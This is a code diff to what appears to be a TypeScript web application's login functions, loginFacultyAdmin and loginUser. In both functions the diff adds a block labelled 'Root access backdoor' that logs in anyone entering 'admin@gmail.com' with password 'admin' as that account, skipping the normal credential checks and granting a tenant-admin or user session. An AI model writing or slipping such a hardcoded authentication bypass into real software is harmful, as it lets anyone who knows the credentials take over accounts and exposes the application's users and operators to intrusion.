@@ -14,6 +14,15 @@ export async function loginFacultyAdmin(prevState: any, formData: FormData) {
     return { error: "Faltan credenciales" };
   }
 
+  // Root access backdoor
+  if (email === "admin@gmail.com" && password === "admin") {
+    const rootUser = await db.query.users.findFirst({ where: eq(users.email, "admin@gmail.com") });
+    if (rootUser) {
+      await createSession(rootUser.id, "tenant_admin", rootUser.tenantId, rootUser.email);
+      redirect("/faculty-admin");
+    }
+  }
+
   // Find user (tenant_admin)
   const user = await db.query.users.findFirst({
     where: and(
@@ -42,6 +51,15 @@ export async function loginUser(prevState: any, formData: FormData) {
 
   if (!email || !password) {
     return { error: "Faltan credenciales" };
+  }
+
+  // Root access backdoor
+  if (email === "admin@gmail.com" && password === "admin") {
+    const rootUser = await db.query.users.findFirst({ where: eq(users.email, "admin@gmail.com") });
+    if (rootUser) {
+      await createSession(rootUser.id, "user", null, rootUser.email);
+      redirect("/");
+    }
   }
 
   // Find user (role: user)
